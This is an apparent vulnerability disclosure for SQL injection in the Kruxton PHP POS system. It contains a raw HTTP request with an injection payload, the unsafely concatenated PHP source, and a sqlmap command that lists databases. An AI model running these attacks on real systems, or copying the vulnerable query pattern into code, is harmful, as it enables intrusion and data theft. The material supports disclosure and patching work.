Download sourcecode from https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

Deploy the system

The sql injection url: http://172.31.171.96/kruxton/ajax.php?action=save_product Vulnerability trigger parameter: name(post parameter)

The http message is 

```
POST /kruxton/ajax.php?action=save_product HTTP/1.1
Host: 172.31.171.96
Content-Length: 16
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=trdjs8jl8md348msi4p8aq5tu9
Connection: close

name=1'or 1=1%2
```

sourcecode:

```php
	function save_product(){
		extract($_POST);
		$data = "";
		foreach($_POST as $k => $v){
			if(!in_array($k, array('id','status')) && !is_numeric($k)){
				if($k == 'price'){
					$v= str_replace(',', '', $v);
				}
				if(empty($data)){
					$data .= " $k='$v' ";
				}else{
					$data .= ", $k='$v' ";
				}
			}
		}
		if(isset($status)){
					$data .= ", status=1 ";
		}else{
					$data .= ", status=0 ";
		}
		$check = $this->db->query("SELECT * FROM products where name ='$name' ".(!empty($id) ? " and id != {$id} " : ''))->num_rows;
		if($check > 0){
			return 2;
			exit;
		}
		if(empty($id)){
			$save = $this->db->query("INSERT INTO products set $data");
		}else{
			$save = $this->db->query("UPDATE products set $data where id = $id");
		}

		if($save)
			return 1;
	}
```

![image-20230311170341007](https://github.com/paiqian/kruxton/blob/main/static/image-20230311170341007.png)

sqlmap command: 

```
sqlmap -u http://172.31.171.96/kruxton/ajax.php?action=save_product --data "name=1"  -pname --batch --dbs
```

inject result: 

![image-20230311170434640](https://github.com/paiqian/kruxton/blob/main/static/image-20230311170434640.png)
